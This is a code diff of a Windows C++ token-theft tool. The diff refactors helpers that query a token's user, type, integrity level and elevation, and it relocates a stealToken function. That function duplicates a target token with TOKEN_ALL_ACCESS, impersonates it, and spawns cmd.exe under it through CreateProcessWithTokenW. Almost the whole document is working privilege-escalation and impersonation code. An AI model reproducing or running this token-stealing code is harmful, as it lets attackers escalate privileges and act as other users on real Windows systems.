@@ -5,86 +5,87 @@
 
 #pragma comment(lib, "advapi32.lib")
 
-void getTokenInformation(HANDLE hToken)
+constexpr SIZE_T MAX_LEN = 256;
+
+struct TUSER
+{
+	wchar_t lpDomain[MAX_LEN];
+	wchar_t lpName[MAX_LEN];
+};
+
+struct TSTAT
+{
+	wchar_t tokenType[MAX_LEN];
+	wchar_t impersonationLevel[MAX_LEN] = L"N/A";
+};
+
+struct TINTG
+{
+	wchar_t integrityLevel[MAX_LEN];
+};
+
+struct TELEV
+{
+	wchar_t isElevated[MAX_LEN];
+	wchar_t elevationType[MAX_LEN];
+};
+
+TUSER getTokenUser(HANDLE hToken)
 {
 	DWORD returnLength = 0;
 	GetTokenInformation(hToken, TokenUser, nullptr, 0, &returnLength);
 	LPVOID lpTokenInfo = NULL;
 	lpTokenInfo = LocalAlloc(LMEM_FIXED, returnLength);
 	GetTokenInformation(hToken, TokenUser, lpTokenInfo, returnLength, &returnLength);
-	constexpr SIZE_T MAX_LEN = 256;
 	DWORD dwSize = MAX_LEN;
-	wchar_t lpName[MAX_LEN];
-	wchar_t lpDomain[MAX_LEN];
+	TUSER tuser = {};
 	SID_NAME_USE sidType;
-	LookupAccountSid(nullptr, ((TOKEN_USER*)lpTokenInfo)->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &sidType);
-	wprintf(L"[+]\tUser: %s\\%s\n", lpDomain, lpName);
+	LookupAccountSid(nullptr, ((TOKEN_USER*)lpTokenInfo)->User.Sid, tuser.lpName, &dwSize, tuser.lpDomain, &dwSize, &sidType);
 	LocalFree((HLOCAL)lpTokenInfo);
+	return tuser;
 }
 
-void createProcessWithToken(HANDLE hToken)
-{
-		LPSTARTUPINFOW sinfo = new STARTUPINFOW();
-		sinfo->cb = sizeof(STARTUPINFOW);
-		sinfo->dwFlags = STARTF_USESHOWWINDOW;
-		sinfo->wShowWindow = 1;
-		PPROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
-		wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe\0";
-		if (!CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, cmd, NULL, NULL, NULL, sinfo, pinfo))
-		{
-			printf("[-] CreateProcessWithTokenW error: %d\n", GetLastError());
-		}
-		printf("[*] starting new process: %d\n", pinfo->dwProcessId);
-}
-
-void stealToken(HANDLE hToken)
-{
-	printf("[*] stealing token\n");
-	HANDLE hTokenDup;
-	if (DuplicateTokenEx(hToken, TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, nullptr, SecurityImpersonation, TokenImpersonation, &hTokenDup))
-	{
-		SetThreadToken(nullptr, hTokenDup);	
-		createProcessWithToken(hTokenDup);
-	}
-	else
-	{
-		printf("[-] error DuplicateTokenEx: %d\n", GetLastError());
-		exit(1);
-	}
-}
-
-void getTokenStatistics(HANDLE hToken)
+TSTAT getTokenStatistics(HANDLE hToken)
 {
 	DWORD returnLength = 0;
 
 	GetTokenInformation(hToken, TokenStatistics, nullptr, returnLength, &returnLength);
 	TOKEN_STATISTICS* lpTokenInfo = (TOKEN_STATISTICS*)LocalAlloc(LMEM_FIXED, returnLength);
 	GetTokenInformation(hToken, TokenStatistics, lpTokenInfo, returnLength, &returnLength);
-	printf("[+]\tToken Type: %s\n", lpTokenInfo->TokenType == 1 ? "TokenPrimary" : "TokenImpersonation");
+	TSTAT tstat = {};
+	if (lpTokenInfo->TokenType == 1)
+	{
+		wcscpy(tstat.tokenType, L"TokenPrimary");
+	}
+	else
+	{
+		wcscpy(tstat.tokenType, L"TokenImpersonation");
+	}
+	
 	if (lpTokenInfo->TokenType == 2)
 	{ 
-		const char* impersonationLevel;
 		switch (lpTokenInfo->ImpersonationLevel)
 		{
 		case 0:
-			impersonationLevel = "SecurityAnonymous";
+			wcscpy(tstat.impersonationLevel, L"SecurityAnonymous");
 			break;
 		case 1:
-			impersonationLevel = "SecurityIdentification";
+			wcscpy(tstat.impersonationLevel, L"SecurityIdentification");
 			break;
 		case 2:
-			impersonationLevel = "SecurityImpersonation";
+			wcscpy(tstat.impersonationLevel, L"SecurityImpersonation");
 			break;
 		case 3:
-			impersonationLevel = "SecurityDelegation";
+			wcscpy(tstat.impersonationLevel, L"SecurityDelegation");
 			break;
 		}
-		printf("[+]\tImpersonation Level: %s\n",impersonationLevel);
+		
 	}
 	LocalFree((HLOCAL)lpTokenInfo);
+	return tstat;
 } 
 
-void getTokenIntegrityLevel(HANDLE hToken)
+TINTG getTokenIntegrityLevel(HANDLE hToken)
 {
 	DWORD returnLength = 0;
 
@@ -95,56 +96,101 @@ void getTokenIntegrityLevel(HANDLE hToken)
 	PUCHAR lpCount = GetSidSubAuthorityCount(lpTokenInfo->Label.Sid);
 	PDWORD lpSubAuthority = GetSidSubAuthority(lpTokenInfo->Label.Sid, *lpCount - 1);
 
-	const char* integrityLevel;
+	TINTG tintg = {};
 	if (*lpSubAuthority >= SECURITY_MANDATORY_SYSTEM_RID)
 	{
-		integrityLevel = "SYSTEM";
+		wcscpy(tintg.integrityLevel, L"SYSTEM");
 	}
 	else if (*lpSubAuthority >= SECURITY_MANDATORY_HIGH_RID)
 	{
-		integrityLevel = "HIGH";
+		wcscpy(tintg.integrityLevel, L"HIGH");
 	}
 	else if (*lpSubAuthority >= SECURITY_MANDATORY_MEDIUM_RID)
 	{
-		integrityLevel = "MEDIUM";
+		wcscpy(tintg.integrityLevel, L"MEDIUM");
 	}
 	else if (*lpSubAuthority >= SECURITY_MANDATORY_LOW_RID)
 	{
-		integrityLevel = "LOW";
+		wcscpy(tintg.integrityLevel, L"LOW");
 	}
 	else
 	{
-		integrityLevel = "UNTRUSTED";
+		wcscpy(tintg.integrityLevel, L"UNTRUSTED");
 	}
-
-	printf("[+]\tIntegrity Level: %s\n", integrityLevel);
 	LocalFree((HLOCAL)lpTokenInfo);
+	return tintg;
 }
 
-void getTokenElevationType(HANDLE hToken)
+TELEV getTokenElevationType(HANDLE hToken)
 {
 	DWORD returnLength;
 
-	TOKEN_ELEVATION* lpTokenInfo = (TOKEN_ELEVATION*)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_ELEVATION));
+	GetTokenInformation(hToken, TokenElevation, nullptr, returnLength, &returnLength);
+	TOKEN_ELEVATION* lpTokenInfo = (TOKEN_ELEVATION*)LocalAlloc(LMEM_FIXED, returnLength);
 	GetTokenInformation(hToken, TokenElevation, lpTokenInfo, returnLength, &returnLength);
-	printf("[+]\tIs Elevated: %s\n", lpTokenInfo->TokenIsElevated == 0 ? "False" : "True");
 
-	returnLength = 0;
-	TOKEN_ELEVATION_TYPE * tet = (TOKEN_ELEVATION_TYPE*)LocalAlloc(LMEM_FIXED, sizeof(TOKEN_ELEVATION_TYPE));
-	GetTokenInformation(hToken, TokenElevationType, tet, returnLength, &returnLength);
-	const char* tokenElevationType;
+	TELEV telev = {};
+	if (lpTokenInfo->TokenIsElevated == 0)
+	{
+		wcscpy(telev.isElevated, L"FALSE");
+	}
+	else
+	{
+		wcscpy(telev.isElevated, L"TRUE");
+	}
+
+	GetTokenInformation(hToken, TokenElevation, nullptr, returnLength, &returnLength);
+	TOKEN_ELEVATION_TYPE* tet = (TOKEN_ELEVATION_TYPE*)LocalAlloc(LMEM_FIXED, returnLength);
+	if (!GetTokenInformation(hToken, TokenElevationType, tet, returnLength, &returnLength))
+	{
+		printf("[-] error GetTokenInformation TOKEN_ELEVATION_TYPE: %d\n", GetLastError());
+	}
+	
+
 	switch (*tet)
 	{
 	case TokenElevationTypeDefault:
-		tokenElevationType = "TokenElevationTypeDefault";
+		wcscpy(telev.elevationType, L"Default");
 		break;
 	case TokenElevationTypeFull:
-		tokenElevationType = "TokenElevationTypeFull";
+		wcscpy(telev.elevationType, L"Full");
 		break;
 	case TokenElevationTypeLimited:
-		tokenElevationType = "TokenElevationTypeLimited";
+		wcscpy(telev.elevationType, L"Limited");
 		break;
 	}
-	printf("[+]\tElevation Type: %s\n", tokenElevationType);
 	LocalFree((HLOCAL)lpTokenInfo);
+	return telev;
 }
+
+void createProcessWithToken(HANDLE hToken)
+{
+	LPSTARTUPINFOW sinfo = new STARTUPINFOW();
+	sinfo->cb = sizeof(STARTUPINFOW);
+	sinfo->dwFlags = STARTF_USESHOWWINDOW;
+	sinfo->wShowWindow = 1;
+	PPROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
+	wchar_t cmd[] = L"C:\\Windows\\System32\\cmd.exe\0";
+	if (!CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL, cmd, NULL, NULL, NULL, sinfo, pinfo))
+	{
+		printf("[-] CreateProcessWithTokenW error: %d\n", GetLastError());
+	}
+	printf("[*] starting new process: %d\n", pinfo->dwProcessId);
+}
+
+void stealToken(HANDLE hToken)
+{
+	printf("[*] stealing token\n");
+	HANDLE hTokenDup;
+	if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenImpersonation, &hTokenDup))
+	{
+		SetThreadToken(nullptr, hTokenDup);
+		createProcessWithToken(hTokenDup);
+	}
+	else
+	{
+		printf("[-] error DuplicateTokenEx: %d\n", GetLastError());
+		exit(1);
+	}
+}
+
